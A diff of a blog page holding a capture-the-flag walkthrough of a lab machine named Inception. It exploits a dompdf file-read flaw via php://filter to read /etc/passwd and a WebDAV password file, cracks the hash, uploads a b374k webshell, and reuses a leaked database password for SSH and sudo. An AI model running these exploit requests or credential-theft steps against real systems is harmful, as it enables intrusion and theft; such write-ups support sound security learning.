@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.91.2" />
+<meta name="generator" content="Hugo 0.96.0" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -311,392 +311,392 @@ if (language) {
 
 <h2 id="port-scanning">Port scanning</h2>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo masscan -e tun0 -p0-65535 --max-rate <span class="m">500</span> 10.10.10.67
-<span class="err">
-</span><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-04-14 09:24:04 GMT
-</span><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
-</span><span class="go">Initiating SYN Stealth Scan
-</span><span class="go">Scanning 1 hosts [65536 ports/host]
-</span><span class="go">Discovered open port 80/tcp on 10.10.10.67                                     
-</span><span class="go">Discovered open port 3128/tcp on 10.10.10.67   
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo masscan -e tun0 -p0-65535 --max-rate <span class="m">500</span> 10.10.10.67
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-04-14 09:24:04 GMT
+</span></span></span><span class="line"><span class="cl"><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+</span></span></span><span class="line"><span class="cl"><span class="go">Initiating SYN Stealth Scan
+</span></span></span><span class="line"><span class="cl"><span class="go">Scanning 1 hosts [65536 ports/host]
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 80/tcp on 10.10.10.67                                     
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 3128/tcp on 10.10.10.67   
+</span></span></span></code></pre></div></div>
 
 <p>We found TCP ports 80 and 3128 open. Let&rsquo;s explore them using nmap:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo nmap -A -p80,3128 10.10.10.67
-<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-14 12:28 EEST
-</span><span class="go">Nmap scan report for 10.10.10.67
-</span><span class="go">Host is up (0.085s latency).
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">PORT     STATE SERVICE    VERSION
-</span><span class="go">80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
-</span><span class="go">|_http-server-header: Apache/2.4.18 (Ubuntu)
-</span><span class="go">|_http-title: Inception
-</span><span class="go">3128/tcp open  http-proxy Squid http proxy 3.5.12
-</span><span class="go">|_http-server-header: squid/3.5.12
-</span><span class="go">|_http-title: ERROR: The requested URL could not be retrieved
-</span><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-</span><span class="go">Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 3.16 (90%)
-</span><span class="go">No exact OS matches for host (test conditions non-ideal).
-</span><span class="go">Network Distance: 2 hops
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo nmap -A -p80,3128 10.10.10.67
+</span></span><span class="line"><span class="cl"><span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-14 12:28 EEST
+</span></span></span><span class="line"><span class="cl"><span class="go">Nmap scan report for 10.10.10.67
+</span></span></span><span class="line"><span class="cl"><span class="go">Host is up (0.085s latency).
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PORT     STATE SERVICE    VERSION
+</span></span></span><span class="line"><span class="cl"><span class="go">80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: Apache/2.4.18 (Ubuntu)
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Inception
+</span></span></span><span class="line"><span class="cl"><span class="go">3128/tcp open  http-proxy Squid http proxy 3.5.12
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: squid/3.5.12
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: ERROR: The requested URL could not be retrieved
+</span></span></span><span class="line"><span class="cl"><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span></span></span><span class="line"><span class="cl"><span class="go">Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 3.16 (90%)
+</span></span></span><span class="line"><span class="cl"><span class="go">No exact OS matches for host (test conditions non-ideal).
+</span></span></span><span class="line"><span class="cl"><span class="go">Network Distance: 2 hops
+</span></span></span></code></pre></div></div></p>
 
 <h1 id="getting-shell">Getting shell</h1>
 
 <p>If we view the the source code of the main page (view-source:<a href="http://10.10.10.67/" target="_blank">http://10.10.10.67/</a>) we notice a comment:
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...
-&lt;!-- Todo: test dompdf on php 7.x --&gt;
-...</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">&lt;!-- Todo: test dompdf on php 7.x --&gt;
+</span></span><span class="line"><span class="cl">...</span></span></code></pre></div></p>
 
 <p>Let&rsquo;s try to visit <a href="http://10.10.10.67/dompdf/" target="_blank">http://10.10.10.67/dompdf/</a>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Index of /dompdf
-[ICO]       Name                         Last modified       Size
-[PARENTDIR] Parent Directory         -
-[   ]       CONTRIBUTING.md              2014-01-26 20:25    3.1K
-[   ]       LICENSE.LGPL                 2013-05-24 03:47    24K
-[   ]       README.md                    2014-02-07 03:30    4.8K
-[   ]       VERSION                      2014-02-07 06:35    5
-[   ]       composer.json                2014-02-02 08:33    559
-[   ]       dompdf.php                   2013-05-24 03:47    6.9K
-[   ]       dompdf_config.custom.inc.php 2013-11-07 04:45    1.2K
-[   ]       dompdf_config.inc.php        2017-11-06 02:21    13K
-[DIR]       include/                     2014-02-08 01:00    -
-[DIR]       lib/                         2014-02-08 01:00    -
-[   ]       load_font.php                2013-05-24 03:47    5.2K
-Apache/2.4.18 (Ubuntu) Server at 10.10.10.67 Port 80</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Index of /dompdf
+</span></span><span class="line"><span class="cl">[ICO]       Name                         Last modified       Size
+</span></span><span class="line"><span class="cl">[PARENTDIR] Parent Directory         -
+</span></span><span class="line"><span class="cl">[   ]       CONTRIBUTING.md              2014-01-26 20:25    3.1K
+</span></span><span class="line"><span class="cl">[   ]       LICENSE.LGPL                 2013-05-24 03:47    24K
+</span></span><span class="line"><span class="cl">[   ]       README.md                    2014-02-07 03:30    4.8K
+</span></span><span class="line"><span class="cl">[   ]       VERSION                      2014-02-07 06:35    5
+</span></span><span class="line"><span class="cl">[   ]       composer.json                2014-02-02 08:33    559
+</span></span><span class="line"><span class="cl">[   ]       dompdf.php                   2013-05-24 03:47    6.9K
+</span></span><span class="line"><span class="cl">[   ]       dompdf_config.custom.inc.php 2013-11-07 04:45    1.2K
+</span></span><span class="line"><span class="cl">[   ]       dompdf_config.inc.php        2017-11-06 02:21    13K
+</span></span><span class="line"><span class="cl">[DIR]       include/                     2014-02-08 01:00    -
+</span></span><span class="line"><span class="cl">[DIR]       lib/                         2014-02-08 01:00    -
+</span></span><span class="line"><span class="cl">[   ]       load_font.php                2013-05-24 03:47    5.2K
+</span></span><span class="line"><span class="cl">Apache/2.4.18 (Ubuntu) Server at 10.10.10.67 Port 80</span></span></code></pre></div></p>
 
 <p>Nice. Let&rsquo;s check its version <a href="http://10.10.10.67/dompdf/VERSION" target="_blank">http://10.10.10.67/dompdf/VERSION</a>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">0.6.0</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">0.6.0</span></span></code></pre></div></p>
 
 <p>Now, we can search for exploits:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>searchsploit dompdf 0.6.0 -w
-<span class="go">-------------------------------------------------------
-</span><span class="go">dompdf 0.6.0 - &#39;dompdf.php?read&#39; Arbitrary File Read
-</span><span class="go">    https://www.exploit-db.com/exploits/33004/
-</span><span class="go">dompdf 0.6.0 beta1 - Remote File Inclusion
-</span><span class="go">    https://www.exploit-db.com/exploits/14851/
-</span><span class="go">-------------------------------------------------------
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> searchsploit dompdf 0.6.0 -w
+</span></span><span class="line"><span class="cl"><span class="go">-------------------------------------------------------
+</span></span></span><span class="line"><span class="cl"><span class="go">dompdf 0.6.0 - &#39;dompdf.php?read&#39; Arbitrary File Read
+</span></span></span><span class="line"><span class="cl"><span class="go">    https://www.exploit-db.com/exploits/33004/
+</span></span></span><span class="line"><span class="cl"><span class="go">dompdf 0.6.0 beta1 - Remote File Inclusion
+</span></span></span><span class="line"><span class="cl"><span class="go">    https://www.exploit-db.com/exploits/14851/
+</span></span></span><span class="line"><span class="cl"><span class="go">-------------------------------------------------------
+</span></span></span></code></pre></div></div></p>
 
 <p>Exploit 33004 inform us for arbitrary file read vulnerability is present on dompdf.php file:
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=&lt;PATH_TO_THE_FILE&gt;</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span></code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=&lt;PATH_TO_THE_FILE&gt;</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span></span></span></code></pre></div></p>
 
 <p>Let&rsquo;s test it <a href="http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd" target="_blank">http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd</a>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...
-sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
-cobb:x:1000:1000::/home/cobb:/bin/bash
-ftp:x:107:112:ftp daemon,,,:/srv/ftp:/bin/false
-...</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">cobb:x:1000:1000::/home/cobb:/bin/bash
+</span></span><span class="line"><span class="cl">ftp:x:107:112:ftp daemon,,,:/srv/ftp:/bin/false
+</span></span><span class="line"><span class="cl">...</span></span></code></pre></div></p>
 
 <p>Nice! It works. Now, let&rsquo;s examine some interesting files:
 <a href="http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/apache2/sites-enabled/000-default.conf" target="_blank">http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/apache2/sites-enabled/000-default.conf</a>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...
-    Alias /webdav_test_inception /var/www/html/webdav_test_inception
-    &lt;Location /webdav_test_inception&gt;
-        Options FollowSymLinks
-        DAV On
-        AuthType Basic
-        AuthName &#34;webdav test credential&#34;
-        AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd
-        Require valid-user
-    &lt;/Location&gt;
-...</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">    Alias /webdav_test_inception /var/www/html/webdav_test_inception
+</span></span><span class="line"><span class="cl">    &lt;Location /webdav_test_inception&gt;
+</span></span><span class="line"><span class="cl">        Options FollowSymLinks
+</span></span><span class="line"><span class="cl">        DAV On
+</span></span><span class="line"><span class="cl">        AuthType Basic
+</span></span><span class="line"><span class="cl">        AuthName &#34;webdav test credential&#34;
+</span></span><span class="line"><span class="cl">        AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd
+</span></span><span class="line"><span class="cl">        Require valid-user
+</span></span><span class="line"><span class="cl">    &lt;/Location&gt;
+</span></span><span class="line"><span class="cl">...</span></span></code></pre></div></p>
 
 <h2 id="webshell">Webshell</h2>
 
 <p>Interesting! Let&rsquo;s see this webdav.passwd:  <a href="http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/webdav_test_inception/webdav.passwd" target="_blank">http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/webdav_test_inception/webdav.passwd</a>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...
-webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
-...</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
+</span></span><span class="line"><span class="cl">...</span></span></code></pre></div></p>
 
 <p>Let&rsquo;s find the hash type (don&rsquo;t forget to escape $ or enclose the whole hash in single quotes):
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>hashid <span class="se">\$</span>apr1<span class="se">\$</span>8rO7Smi4<span class="se">\$</span>yqn7H.GvJFtsTou1a7VME0
-<span class="go">Analyzing &#39;$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0&#39;
-</span><span class="go">[+] MD5(APR) 
-</span><span class="go">[+] Apache MD5
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="gp">$ </span>hashid <span class="s1">&#39;$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0&#39;</span>
-<span class="go">Analyzing &#39;$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0&#39;
-</span><span class="go">[+] MD5(APR) 
-</span><span class="go">[+] Apache MD5 
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> hashid <span class="se">\$</span>apr1<span class="se">\$</span>8rO7Smi4<span class="se">\$</span>yqn7H.GvJFtsTou1a7VME0
+</span></span><span class="line"><span class="cl"><span class="go">Analyzing &#39;$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] MD5(APR) 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Apache MD5
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> hashid <span class="s1">&#39;$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">Analyzing &#39;$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] MD5(APR) 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Apache MD5 
+</span></span></span></code></pre></div></div></p>
 
 <p>Let&rsquo;s crack (i.e. reverse) this hash:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>hashcat -h <span class="p">|</span> grep MD5 <span class="p">|</span> grep APR
-<span class="go">   1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)            | HTTP, SMTP, LDAP Server
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="gp">$ </span>hashcat -m <span class="m">1600</span> <span class="s1">&#39;$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0&#39;</span> /usr/share/dict/rockyou.txt
-<span class="go">...
-</span><span class="go"></span><span class="gp">$</span>apr1<span class="nv">$8</span>rO7Smi4<span class="nv">$yqn7H</span>.GvJFtsTou1a7VME0:babygurl69
-<span class="go">...
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> hashcat -h <span class="p">|</span> grep MD5 <span class="p">|</span> grep APR
+</span></span><span class="line"><span class="cl"><span class="go">   1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)            | HTTP, SMTP, LDAP Server
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> hashcat -m <span class="m">1600</span> <span class="s1">&#39;$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0&#39;</span> /usr/share/dict/rockyou.txt
+</span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span>apr1<span class="nv">$8</span>rO7Smi4<span class="nv">$yqn7H</span>.GvJFtsTou1a7VME0:babygurl69
+</span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span></code></pre></div></div></p>
 
 <p>Therefore our webdav login credentials are webdav_tester:babygurl69. If you try to obtain a usual shell you will discover soon that most kinds of traffic are blocked by the firewall. So, we are gonna upload a webshell to get us going:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>cadaver
-<span class="go">dav:!&gt; open http://10.10.10.67/webdav_test_inception
-</span><span class="go">Authentication required for webdav test credential on server `127.0.1.1&#39;:
-</span><span class="go">Username: webdav_tester
-</span><span class="go">Password: babygurl69
-</span><span class="go">dav:/webdav_test_inception/&gt; put b374k.php
-</span><span class="go">Uploading b374k.php to `/webdav_test_inception/b374k.php&#39;:
-</span><span class="go">Progress: [=============================&gt;] 100.0% of 947 bytes succeeded.
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cadaver
+</span></span><span class="line"><span class="cl"><span class="go">dav:!&gt; open http://10.10.10.67/webdav_test_inception
+</span></span></span><span class="line"><span class="cl"><span class="go">Authentication required for webdav test credential on server `127.0.1.1&#39;:
+</span></span></span><span class="line"><span class="cl"><span class="go">Username: webdav_tester
+</span></span></span><span class="line"><span class="cl"><span class="go">Password: babygurl69
+</span></span></span><span class="line"><span class="cl"><span class="go">dav:/webdav_test_inception/&gt; put b374k.php
+</span></span></span><span class="line"><span class="cl"><span class="go">Uploading b374k.php to `/webdav_test_inception/b374k.php&#39;:
+</span></span></span><span class="line"><span class="cl"><span class="go">Progress: [=============================&gt;] 100.0% of 947 bytes succeeded.
+</span></span></span></code></pre></div></div></p>
 
 <p>Now, we can visit <a href="http://10.10.10.67/webdav_test_inception/b374k.php" target="_blank">http://10.10.10.67/webdav_test_inception/b374k.php</a> in order to have access to our webshell (use webdav_tester:babygurl69 again for credentials).</p>
 
 <h2 id="ssh-shell">SSH shell</h2>
 
 <p>If we explore the box a little, using our webshell, we are gonna find MySQL credentials inside /var/www/html/wordpress_4.8.3/wp-config.php:
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...
-/** MySQL database username */ 
-define(&#39;DB_USER&#39;, &#39;root&#39;); 
-
-/** MySQL database password */ 
-define(&#39;DB_PASSWORD&#39;, &#39;VwPddNh7xMZyDQoByQL4&#39;);
-...</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">/** MySQL database username */ 
+</span></span><span class="line"><span class="cl">define(&#39;DB_USER&#39;, &#39;root&#39;); 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/** MySQL database password */ 
+</span></span><span class="line"><span class="cl">define(&#39;DB_PASSWORD&#39;, &#39;VwPddNh7xMZyDQoByQL4&#39;);
+</span></span><span class="line"><span class="cl">...</span></span></code></pre></div></p>
 
 <p>Remember, we know already a user name from /etc/passwd (cobb). Maybe that password for MySQL is re-used. Let&rsquo;s try it.
 First, add the squid proxy to /etc/proxychains.conf:
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...
-http 10.10.10.67 3128
-...</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">http 10.10.10.67 3128
+</span></span><span class="line"><span class="cl">...</span></span></code></pre></div></p>
 
 <p>Now try this:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>proxychains ssh cobb@127.0.1.1
-<span class="go">[proxychains] config file found: /etc/proxychains.conf
-</span><span class="go">[proxychains] preloading /usr/lib64/libproxychains.so.4.12
-</span><span class="go">[proxychains] DLL init: proxychains-ng 4.12
-</span><span class="go">[proxychains] Strict chain  ...  10.10.10.67:3128  ...  127.0.1.1:22  ...  OK
-</span><span class="go">cobb@127.0.1.1&#39;s password: 
-</span><span class="go">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go"> * Documentation:  https://help.ubuntu.com
-</span><span class="go"> * Management:     https://landscape.canonical.com
-</span><span class="go"> * Support:        https://ubuntu.com/advantage
-</span><span class="go">Last login: Sat Apr 14 12:01:57 2018 from 127.0.0.1
-</span><span class="go">cobb@Inception:~$ 
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> proxychains ssh cobb@127.0.1.1
+</span></span><span class="line"><span class="cl"><span class="go">[proxychains] config file found: /etc/proxychains.conf
+</span></span></span><span class="line"><span class="cl"><span class="go">[proxychains] preloading /usr/lib64/libproxychains.so.4.12
+</span></span></span><span class="line"><span class="cl"><span class="go">[proxychains] DLL init: proxychains-ng 4.12
+</span></span></span><span class="line"><span class="cl"><span class="go">[proxychains] Strict chain  ...  10.10.10.67:3128  ...  127.0.1.1:22  ...  OK
+</span></span></span><span class="line"><span class="cl"><span class="go">cobb@127.0.1.1&#39;s password: 
+</span></span></span><span class="line"><span class="cl"><span class="go">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> * Documentation:  https://help.ubuntu.com
+</span></span></span><span class="line"><span class="cl"><span class="go"> * Management:     https://landscape.canonical.com
+</span></span></span><span class="line"><span class="cl"><span class="go"> * Support:        https://ubuntu.com/advantage
+</span></span></span><span class="line"><span class="cl"><span class="go">Last login: Sat Apr 14 12:01:57 2018 from 127.0.0.1
+</span></span></span><span class="line"><span class="cl"><span class="go">cobb@Inception:~$ 
+</span></span></span></code></pre></div></div></p>
 
 <p>Yeah! It works! :D</p>
 
 <p>Now let&rsquo;s see if our cobb user has any sudo right:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">cobb@Inception:~$ sudo -l
-</span><span class="go">[sudo] password for cobb: VwPddNh7xMZyDQoByQL4
-</span><span class="go">Matching Defaults entries for cobb on Inception:
-</span><span class="go">   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">User cobb may run the following commands on Inception:
-</span><span class="go">   (ALL : ALL) ALL
-</span><span class="go">   
-</span><span class="go">cobb@Inception:~$ sudo -i (or sudo su)
-</span><span class="go">Password: VwPddNh7xMZyDQoByQL4
-</span><span class="go">root@Inception:/home/cobb# whoami
-</span><span class="go">root
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cobb@Inception:~$ sudo -l
+</span></span></span><span class="line"><span class="cl"><span class="go">[sudo] password for cobb: VwPddNh7xMZyDQoByQL4
+</span></span></span><span class="line"><span class="cl"><span class="go">Matching Defaults entries for cobb on Inception:
+</span></span></span><span class="line"><span class="cl"><span class="go">   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">User cobb may run the following commands on Inception:
+</span></span></span><span class="line"><span class="cl"><span class="go">   (ALL : ALL) ALL
+</span></span></span><span class="line"><span class="cl"><span class="go">   
+</span></span></span><span class="line"><span class="cl"><span class="go">cobb@Inception:~$ sudo -i (or sudo su)
+</span></span></span><span class="line"><span class="cl"><span class="go">Password: VwPddNh7xMZyDQoByQL4
+</span></span></span><span class="line"><span class="cl"><span class="go">root@Inception:/home/cobb# whoami
+</span></span></span><span class="line"><span class="cl"><span class="go">root
+</span></span></span></code></pre></div></div>
 Wow! We are root. Let&rsquo;s get this flag. :D</p>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">root@Inception:/home/cobb# cd /root
-</span><span class="go">root@Inception:~# cat root.txt
-</span><span class="go">You&#39;re waiting for a train. A train that will take you far away. Wake up to find root.txt
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">root@Inception:/home/cobb# cd /root
+</span></span></span><span class="line"><span class="cl"><span class="go">root@Inception:~# cat root.txt
+</span></span></span><span class="line"><span class="cl"><span class="go">You&#39;re waiting for a train. A train that will take you far away. Wake up to find root.txt
+</span></span></span></code></pre></div></div>
 
 <p>Well&hellip; not so soon. It appears that we are inside another box.</p>
 
 <h1 id="privilege-escalation">Privilege escalation</h1>
 
 <p>Let&rsquo;s explore a little:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">root@Inception:~# cat /etc/resolv.conf
-</span><span class="go"></span><span class="gp"># </span>Dynamic resolv.conf<span class="o">(</span>5<span class="o">)</span> file <span class="k">for</span> glibc resolver<span class="o">(</span>3<span class="o">)</span> generated by resolvconf<span class="o">(</span>8<span class="o">)</span>
-<span class="gp">#     </span>DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
-<span class="go">nameserver 192.168.0.1
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">root@Inception:~# arp -a
-</span><span class="go">? (192.168.0.1) at fe:ae:a2:b2:88:11 [ether] on eth0
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">root@Inception:~# ifconfig
-</span><span class="go">eth0      Link encap:Ethernet  HWaddr 00:16:3e:28:53:63  
-</span><span class="go">          inet addr:192.168.0.10  Bcast:192.168.0.255  Mask:255.255.255.0
-</span><span class="go">          inet6 addr: fe80::216:3eff:fe28:5363/64 Scope:Link
-</span><span class="go">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
-</span><span class="go">          RX packets:858019 errors:0 dropped:0 overruns:0 frame:0
-</span><span class="go">          TX packets:583712 errors:0 dropped:0 overruns:0 carrier:0
-</span><span class="go">          collisions:0 txqueuelen:1000 
-</span><span class="go">          RX bytes:74512993 (74.5 MB)  TX bytes:106431159 (106.4 MB)
-</span><span class="go">...
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">root@Inception:~# cat /etc/network/interfaces
-</span><span class="go"></span><span class="gp"># </span>This file describes the network interfaces available on your system
-<span class="gp"># </span>and how to activate them. For more information, see interfaces<span class="o">(</span>5<span class="o">)</span>.
-<span class="err">
-</span><span class="err"></span><span class="gp"># </span>The loopback network interface
-<span class="go">auto lo
-</span><span class="go">iface lo inet loopback
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">auto eth0
